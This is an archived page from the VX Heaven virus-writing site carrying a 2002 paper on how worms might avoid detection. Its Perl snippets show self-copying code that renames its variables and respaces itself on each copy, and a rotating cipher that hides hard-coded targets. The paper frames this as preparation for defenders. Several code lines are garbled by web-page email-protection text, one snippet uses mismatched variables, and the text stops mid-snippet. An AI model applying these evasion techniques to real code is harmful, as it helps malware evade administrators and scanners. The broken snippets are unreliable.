<?xml version="1.0"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<title> One Semicolon 'Techniques a worm might use to be harder to locate' (VX heaven)</title>
<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
<meta name="Author" content="One Semicolon"/>
<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири, One Semicolon,Techniques a worm might use to be harder to locate, information, introduction, print, worm, program, chapter, onesemicolon, hide, instance, hard, code, changed, time, ideas, appendix"/>
<meta name="Description" content="This paper will discuss different things a worm might do in the future. Snippets of code are included. These snippets are written in Perl. Even if you do not program in Perl, this paper might be interesting just for the ideas that it has."/>
<script type="text/javascript">
//<![CDATA[
try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"fe4bd84ff399a275608052909eab4005bcc9eaf3-1498757265-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
//]]>
</script>
<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="stylesheet" type="text/css" href="/style.css"/><link rel="canonical" href="http://vxheaven.org/lib/vos00.html"/>
<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
</head>
<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
<div class="s1">
<div style="float:right;"><a href="/lib/index.php?tbs=1"><img src="/img/max.gif" alt="Maximize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option selected="selected" value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
<div style="float: right;"><div id="plusone"></div></div>
<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
<div style="float: right;" class="addthis_toolbox addthis_default_style">
<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
</div>
<div style="float: right;">
<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
<form action="/search.php" id="cse-search-box">
<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
<input type="hidden" name="cof" value="FORID:10"/>
<input type="hidden" name="ie" value="UTF-8"/>
<input type="text" name="q" size="12" value=" "/>
<input type="submit" name="sa" value="Search"/>
</form>
</div><h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
</div>
<div class="s2"><h1>Techniques a worm might use to be harder to locate</h1><p><a href="/lib/?lang=en&amp;author=One%20Semicolon"> One Semicolon</a><br/> <em>February 2002</em></p><script type="text/rocketscript">var disqus_url = 'http://vxheaven.org/lib/vos00.html';</script>[<a style="" href="/lib/?lang=EN&amp;index=WO#vos00">Back to index</a>] [<a href="/lib/vos00.html#disqus_thread">Comments</a>]<br/> 
<address>
<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="bad7dffad5d4dfc9dfd7d3d9d5d6d5d494d9d0d894d4dfce">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script><br/>
http://onesemicolon.cjb.net
</address>
<ul>
<li><a href="#p1">1 Introduction - why and what</a></li>
<li><a href="#p2">2 The shape of the code</a>
<ul>
<li><a href="#p21">2.1 Introduction</a></li>
<li><a href="#p22">2.2 Making it work</a></li>
</ul></li>
<li><a href="#p3">3 Hiding hard coded information</a>
<ul>
<li><a href="#p31">3.1 Introduction</a></li>
<li><a href="#p32">3.2 Making it work</a></li>
</ul></li>
<li><a href="#p4">4 Roaming</a>
<ul>
<li><a href="#p41">4.1 Introduction</a></li>
<li><a href="#p42">4.2 Relocating</a></li>
<li><a href="#p43">4.3 Adapting</a></li>
</ul></li>
<li><a href="#p5">5 Memory management</a>
<ul>
<li><a href="#p51">5.1 Introduction</a></li>
<li><a href="#p52">5.2 How it works</a></li>
</ul></li>
<li><a href="#p6">6 Acting Normal</a>
<ul>
<li><a href="#p61">6.1 Introduction</a></li>
<li><a href="#p62">6.2 HTTP</a></li>
</ul></li>
<li><a href="#p7">7 Closing</a></li>
<li><a href="#pa">Appendix</a>
<ul>
<li><a href="#pa1">A.1 Example program for chapter 2</a></li>
<li><a href="#pa2">A.2 Example program for chapter 3</a></li>
<li><a href="#pa3">A.3 Example program chapter 4</a></li>
<li><a href="#pa4">A.4 Example program for chapter 6</a></li>
<li><a href="#pb">B Browser footprints</a>
<ul>
<li><a href="#pb1">B.1 Note</a></li>
<li><a href="#pb2">B.2 Netscape 4.73</a></li>
<li><a href="#pb3">B.3 Netscape 6.1</a></li>
<li><a href="#pb4">B.4 Opera 6</a></li>
<li><a href="#pb5">B.5 Internet Explorer 5.50.4134.0100</a></li>
</ul></li>
</ul></li>
</ul>
<h2><a name="p1"></a>1 Introduction - why and what</h2>
<p>A little while back we had a wave of worms. During the wave there were a lot of people writing about infection rates. Code Red for example quickly ballooned in size and infected a great amount of people in a relatively short period of time. There were ideas on how to infect more computers in shorter amounts of time but no one had ideas on how to hide the activities of the worms.</p>
<p>Shortly after a worm appears to have an impact a lot of quickly programmed cleaners are created for the "worm du jour". Even though they are two minute creations they work surprisingly well.</p>
<p>Worms have changed very little compared to the first worm years and years ago. They have changed very little because there was no need to. Recently a lot more attention was given to worms and because of that there is more awareness. Awareness means that writers of worms will need to do a better job at making their code stay hidden from the sight of administrators. I believe it is a good idea to philosophize about what may be ahead so we can have the antidote ready for anything that may come up. Perhaps if a lot of people are prepared for any worm that comes up, worms will not be as interesting as they were once before.</p>
<p>This paper will discuss different things a worm might do in the future. Snippets of code are included. These snippets are written in Perl. Even if you do not program in Perl, this paper might be interesting just for the ideas that it has.</p>
<p>The snippets of code are explained in such a way that even a person new to Perl will be able to understand it. My apologies if that frustrates some of the more knowledgeable people among us.</p>
<h2><a name="p2"></a>2 The shape of the code</h2>
<h3><a name="p21"></a>2.1 Introduction</h3>
<p>The trouble is that when viewing a Perl file one can see the code and usually figure out what the code does. Another problem is that a static script or binary are easy to find. In this chapter I'd like to go over some ways to make the code harder to read and at the same time "irregular". Every instance of the code or infection of a computer should be different.</p>
<p>An example program tying everything in this chapter together is in appendix A.1.</p>
<h3><a name="p22"></a>2.2 Making it work</h3>
<p>To change the code we need to create a new instance of it to work with.</p>
<div class="perl" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; <span style="color: #cc66cc;">1</span> &nbsp;<span style="color: #339933;">:</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/open.html"><span style="color: #000066;">open</span></a> <span style="color: black;">&#40;</span>SELF<span style="color: #339933;">,</span> <span style="color: #ff0000;">&quot;&lt;$0&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">2</span> &nbsp;<span style="color: #339933;">:</span> <span style="color: #0000ff;">@self</span> <span style="color: #339933;">=</span> <span style="color: #009999;">&lt;SELF&gt;</span><span style="color: #339933;">;</span><br/>
&nbsp;</div>
<p>This right away shows our issue: It is crystal clear what is happening. The variable and file handle make sense. So we need something to replace them with. What we should create is a simple random variable generator.</p>
<div class="perl" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; <span style="color: #cc66cc;">1</span> &nbsp;<span style="color: #339933;">:</span> <span style="color: #0000ff;">$randomlength</span> <span style="color: #339933;">=</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/int.html"><span style="color: #000066;">int</span></a><span style="color: black;">&#40;</span><a style="color: #000060;" href="http://perldoc.perl.org/functions/rand.html"><span style="color: #000066;">rand</span></a><span style="color: black;">&#40;</span><span style="color: #cc66cc;">4</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">2</span> &nbsp;<span style="color: #339933;">:</span> <span style="color: #0000ff;">$randomlength</span> <span style="color: #339933;">+=</span> <span style="color: #cc66cc;">5</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">3</span> &nbsp;<span style="color: #339933;">:</span> <span style="color: #b1b100;">for</span> <span style="color: black;">&#40;</span><span style="color: #0000ff;">$variable</span> <span style="color: #339933;">=</span> <span style="color: #cc66cc;">0</span><span style="color: #339933;">;</span> <span style="color: #0000ff;">$variable</span> <span style="color: #339933;">&lt;=</span> <span style="color: #0000ff;">$randomlength</span><span style="color: #339933;">;</span> <span style="color: #0000ff;">$variable</span><span style="color: #339933;">++</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
&nbsp; <span style="color: #cc66cc;">4</span> &nbsp;<span style="color: #339933;">:</span> &nbsp; <span style="color: #0000ff;">$randomchar</span> <span style="color: #339933;">=</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/int.html"><span style="color: #000066;">int</span></a><span style="color: black;">&#40;</span><a style="color: #000060;" href="http://perldoc.perl.org/functions/rand.html"><span style="color: #000066;">rand</span></a><span style="color: black;">&#40;</span><span style="color: #cc66cc;">26</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">5</span> &nbsp;<span style="color: #339933;">:</span> &nbsp; <span style="color: #0000ff;">$randomchar</span> <span style="color: #339933;">+=</span> <span style="color: #cc66cc;">97</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">6</span> &nbsp;<span style="color: #339933;">:</span> &nbsp; <span style="color: #0000ff;">$randomvariable</span> <span style="color: #339933;">.=</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/chr.html"><span style="color: #000066;">chr</span></a><span style="color: black;">&#40;</span><span style="color: #0000ff;">$randomchar</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">7</span> &nbsp;<span style="color: #339933;">:</span> <span style="color: black;">&#125;</span><br/>
&nbsp; <span style="color: #cc66cc;">8</span> &nbsp;<span style="color: #339933;">:</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/print.html"><span style="color: #000066;">print</span></a> <span style="color: #ff0000;">&quot;$randomvariable<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">;</span><br/>
&nbsp;</div>
<p>This snippet first creates a random number between 5 and 9 for the length of the variable this creates. Then it goes on to create a variable name from all the letters in the alphabet and prints the result out.</p>
<p>Perl does not care how many spaces there are in the script so we can add random extra spacing as well.</p>
<div class="perl" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; <span style="color: #cc66cc;">1</span> &nbsp;<span style="color: #339933;">:</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/open.html"><span style="color: #000066;">open</span></a> <span style="color: black;">&#40;</span>SELF<span style="color: #339933;">,</span> <span style="color: #ff0000;">&quot;&lt;$0&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">2</span> &nbsp;<span style="color: #339933;">:</span> <span style="color: #0000ff;">@self</span> <span style="color: #339933;">=</span> <span style="color: #009999;">&lt;SELF&gt;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">3</span> &nbsp;<span style="color: #339933;">:</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/open.html"><span style="color: #000066;">open</span></a> <span style="color: black;">&#40;</span>NEXT<span style="color: #339933;">,</span> <span style="color: #ff0000;">&quot;&gt;$ARGV[0]&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">4</span> &nbsp;<span style="color: #339933;">:</span> <span style="color: #b1b100;">foreach</span> <span style="color: #0000ff;">$line</span> <span style="color: black;">&#40;</span><span style="color: #0000ff;">@self</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
&nbsp; <span style="color: #cc66cc;">5</span> &nbsp;<span style="color: #339933;">:</span> &nbsp; <span style="color: #0000ff;">$coin</span> <span style="color: #339933;">=</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/int.html"><span style="color: #000066;">int</span></a><span style="color: black;">&#40;</span><a style="color: #000060;" href="http://perldoc.perl.org/functions/rand.html"><span style="color: #000066;">rand</span></a><span style="color: black;">&#40;</span><span style="color: #cc66cc;">3</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">6</span> &nbsp;<span style="color: #339933;">:</span> &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span><span style="color: #0000ff;">$dice</span> <span style="color: #339933;">==</span> <span style="color: #cc66cc;">0</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span> <span style="color: #0000ff;">$line</span> <span style="color: #339933;">=~</span> <span style="color: #009966; font-style: italic;">s/ / /g</span><span style="color: #339933;">;</span> <span style="color: black;">&#125;</span><br/>
&nbsp; <span style="color: #cc66cc;">7</span> &nbsp;<span style="color: #339933;">:</span> &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span><span style="color: #0000ff;">$dice</span> <span style="color: #339933;">==</span> <span style="color: #cc66cc;">1</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span> <span style="color: #0000ff;">$line</span> <span style="color: #339933;">=~</span> <span style="color: #009966; font-style: italic;">s/ / &nbsp;/g</span><span style="color: #339933;">;</span> <span style="color: black;">&#125;</span><br/>
&nbsp; <span style="color: #cc66cc;">8</span> &nbsp;<span style="color: #339933;">:</span> &nbsp; <span style="color: #0000ff;">$line</span> <span style="color: #339933;">=~</span> <span style="color: #009966; font-style: italic;">s/ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;/ &nbsp;/g</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">9</span> &nbsp;<span style="color: #339933;">:</span> &nbsp; <a style="color: #000060;" href="http://perldoc.perl.org/functions/print.html"><span style="color: #000066;">print</span></a> NEXT <span style="color: #0000ff;">$line</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">10</span> <span style="color: #339933;">:</span> <span style="color: black;">&#125;</span><br/>
&nbsp; <span style="color: #cc66cc;">11</span> <span style="color: #339933;">:</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/close.html"><span style="color: #000066;">close</span></a> <span style="color: black;">&#40;</span>NEXT<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp;</div>
<p>Here is a quick solution to get random spacing on a per line basis. In A.1 you will see code that when run changes all names of variables, subs, file handles, etc. and outputs itself to a random file name in the directory it is run in. The major addition to the code in the appendix is that it shows how to change the names of everything reliably so when the file that is put out is run, it will work as well.</p>
<p>When reading this, the resulting obfuscation may not sound like much, but wait until you actually see the result after running the code once before giving your opinion. You will see that it is highly effective.</p>
<p>The example in the appendix has strings in it that a hard drive could be searched for. These are just there so you can read what is going on.</p>
<h2><a name="p3"></a>3 Hiding hard coded information</h2>
<h3><a name="p31"></a>3.1 Introduction</h3>
<p>Sometimes a worm has to have information in it that cannot be changed for example, a worm may want to try to flood www.microsoft.com. Putting www.microsoft.com in your code is going to make obvious that whatever the code does, it does at least <em>something</em> with www.microsoft.com.</p>
<p>Another problem is that the worm could easily be locating by searching the hard drive for a string that is relatively unique to the worm. In this chapter I will write about a simple way to hide information.</p>
<h3><a name="p32"></a>3.2 Making it work</h3>
<p>A worm that needs to hide information has no need for very good encryption as the way to decrypt the information would be located in the same file. A solution to hiding files would be a form of a Caesarean encryption. An example of that would be ROT13 encryption where each letter is replaced with a letter thirteen characters down in the alphabet. The following table illustrates this.</p>
<table border="1" summary="ROT13">
<tr><th>&nbsp;</th><th colspan="26">letters</th></tr>
<tr><th>alphabet</th><td>a</td><td>b</td><td>c</td><td>d</td><td>e</td><td>f</td><td>g</td><td>h</td><td>i</td><td>j</td><td>k</td><td>l</td><td>m</td><td>n</td><td>o</td><td>p</td><td>q</td><td>r</td><td>s</td><td>t</td><td>u</td><td>v</td><td>w</td><td>x</td><td>y</td><td>z</td></tr>
<tr><th>ROT13</th><td>n</td><td>o</td><td>p</td><td>q</td><td>r</td><td>s</td><td>t</td><td>u</td><td>v</td><td>w</td><td>x</td><td>y</td><td>z</td><td>a</td><td>b</td><td>c</td><td>d</td><td>e</td><td>f</td><td>g</td><td>h</td><td>i</td><td>j</td><td>k</td><td>l</td><td>m</td></tr>
</table>
<p>ROT13 encryption only rotates letters. It does not take care of digits nor punctuation. If someone would want to hide an email address it would not be hidden properly.</p>
<p><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="157870557a7b706670787c767a797a7b3b767f773b7b7061">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script> would turn into <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="c2b8b082a0a3b0a4b0b8b4b2a0bba0a3ecb2b5adeca3b0a5ec">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script> We can see this is an email address because the "@" is still visible as are the dots. Another problem with using the same encryption for every instance is that it creates excellent strings to search a hard drive for.</p>
<p>To solve that, a worm would need to have encryption that changes for every instance of itself. A simple way of achieving this is to have a variable containing an amount of "rotations" to be performed on a to be encoded or decoded item. One rotation would be one transposition of characters. In the following example we see how a value can easily be encoded and decoded.</p>
<div class="perl" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; <span style="color: #cc66cc;">1</span> &nbsp;<span style="color: #339933;">:</span> <span style="color: #0000ff;">$code</span> <span style="color: #339933;">=</span> <span style="color: #ff0000;">&quot;me<span style="color: #000099; font-weight: bold;">\@</span>onesemicolon.cjb.net&quot;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">2</span> &nbsp;<span style="color: #339933;">:</span> <span style="color: #0000ff;">$rotate</span> <span style="color: #339933;">=</span> <span style="color: #cc66cc;">341251</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">3</span> &nbsp;<span style="color: #339933;">:</span><br/>
&nbsp; <span style="color: #cc66cc;">4</span> &nbsp;<span style="color: #339933;">:</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/print.html"><span style="color: #000066;">print</span></a> <span style="color: #ff0000;">&quot;to encode - $code<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">5</span> &nbsp;<span style="color: #339933;">:</span> <span style="color: #0000ff;">$encrypted</span> <span style="color: #339933;">=</span> <span style="color: #0000ff;">&amp;encrypt</span><span style="color: black;">&#40;</span><span style="color: #0000ff;">$code</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">6</span> &nbsp;<span style="color: #339933;">:</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/print.html"><span style="color: #000066;">print</span></a> <span style="color: #ff0000;">&quot;encrypted - $encrypted<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">7</span> &nbsp;<span style="color: #339933;">:</span> <span style="color: #0000ff;">$decrypted</span> <span style="color: #339933;">=</span> <span style="color: #0000ff;">&amp;decrypted</span><span style="color: black;">&#40;</span><span style="color: #0000ff;">$encrypted</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">8</span> &nbsp;<span style="color: #339933;">:</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/print.html"><span style="color: #000066;">print</span></a> <span style="color: #ff0000;">&quot;decrypted - $decrypted<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">9</span> &nbsp;<span style="color: #339933;">:</span><br/>
&nbsp; <span style="color: #cc66cc;">10</span> <span style="color: #339933;">:</span> <span style="color: #000000; font-weight: bold;">sub</span> encrypt <span style="color: black;">&#123;</span><br/>
&nbsp; <span style="color: #cc66cc;">11</span> <span style="color: #339933;">:</span> &nbsp; <span style="color: #b1b100;">my</span> <span style="color: black;">&#40;</span><span style="color: #0000ff;">$toencrypt</span><span style="color: black;">&#41;</span> <span style="color: #339933;">=</span> <span style="color: #0000ff;">@_</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">12</span> <span style="color: #339933;">:</span> &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">&#40;</span><span style="color: #0000ff;">$rotcount</span> <span style="color: #339933;">=</span> <span style="color: #cc66cc;">0</span><span style="color: #339933;">;</span> <span style="color: #0000ff;">$rotcount</span> <span style="color: #339933;">&lt;=</span> <span style="color: #0000ff;">$rotate</span><span style="color: #339933;">;</span> <span style="color: #0000ff;">$rotcount</span><span style="color: #339933;">++</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
&nbsp; <span style="color: #cc66cc;">13</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp;<span style="color: #0000ff;">$toencrypt</span> <span style="color: #339933;">=~</span> <span style="color: #009966; font-style: italic;"><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="1b6f69347a36615b5a3641352b3622">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>/0-9.@A-Za-z/</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">14</span> <span style="color: #339933;">:</span> &nbsp; <span style="color: black;">&#125;</span><br/>
&nbsp; <span style="color: #cc66cc;">15</span> <span style="color: #339933;">:</span> &nbsp; <a style="color: #000060;" href="http://perldoc.perl.org/functions/return.html"><span style="color: #000066;">return</span></a> <span style="color: #0000ff;">$toencrypt</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">16</span> <span style="color: #339933;">:</span> <span style="color: black;">&#125;</span><br/>
&nbsp; <span style="color: #cc66cc;">17</span> <span style="color: #339933;">:</span><br/>
&nbsp; <span style="color: #cc66cc;">18</span> <span style="color: #339933;">:</span> <span style="color: #000000; font-weight: bold;">sub</span> decrypt <span style="color: black;">&#123;</span><br/>
&nbsp; <span style="color: #cc66cc;">19</span> <span style="color: #339933;">:</span> &nbsp; <span style="color: #b1b100;">my</span> <span style="color: black;">&#40;</span><span style="color: #0000ff;">$todecrypt</span><span style="color: black;">&#41;</span> <span style="color: #339933;">=</span> <span style="color: #0000ff;">@_</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">20</span> <span style="color: #339933;">:</span> &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">&#40;</span><span style="color: #0000ff;">$rotcount</span> <span style="color: #339933;">=</span> <span style="color: #cc66cc;">0</span><span style="color: #339933;">;</span> <span style="color: #0000ff;">$rotcount</span> <span style="color: #339933;">&lt;=</span> <span style="color: #0000ff;">$rotate</span><span style="color: #339933;">;</span> <span style="color: #0000ff;">$rotcount</span><span style="color: #339933;">++</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
&nbsp; <span style="color: #cc66cc;">21</span> <span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp;<span style="color: #0000ff;">$todecrypt</span> <span style="color: #339933;">=~</span> <span style="color: #009966; font-style: italic;">tr/0-9.@<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="68294532094512470945122829453246584551">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>/</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">22</span> <span style="color: #339933;">:</span> <span style="color: black;">&#125;</span><br/>
&nbsp;</div>
<p>When run we can see the line that will be worked with. Then we see the string after letting it go through our mangler 341251 times. Then we have it decrypted again. Right now the decryption and encryption code are in their own subroutines. That way they can be called as needed.</p>
<p>If the amount of iterations per instance of the code is to be different a piece of code would be needed to replace the amount of rotations. Because this is a number and not a string we cannot place it in @switchthese (see A.1). At the moment there is only one number that needs replacing. In the following example we see a simple subroutine that replaces a number.</p>
<div class="perl" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; <span style="color: #cc66cc;">1</span> &nbsp;<span style="color: #339933;">:</span> <span style="color: #0000ff;">$rotate</span> <span style="color: #339933;">=</span> <span style="color: #cc66cc;">34125</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">2</span> &nbsp;<span style="color: #339933;">:</span> <span style="color: #0000ff;">$rotreplace</span> <span style="color: #339933;">=</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/int.html"><span style="color: #000066;">int</span></a><span style="color: black;">&#40;</span><a style="color: #000060;" href="http://perldoc.perl.org/functions/rand.html"><span style="color: #000066;">rand</span></a><span style="color: black;">&#40;</span><span style="color: #cc66cc;">500000</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #cc66cc;">3</span> &nbsp;<span style="color: #339933;">:</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/open.html"><span style="color: #000066;">open</span></a> <span style="color: black;">&#40;</span>SELF<span style="color: #339933;">,</span> <span style="color: #ff0000;">&quot;&lt;$0&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
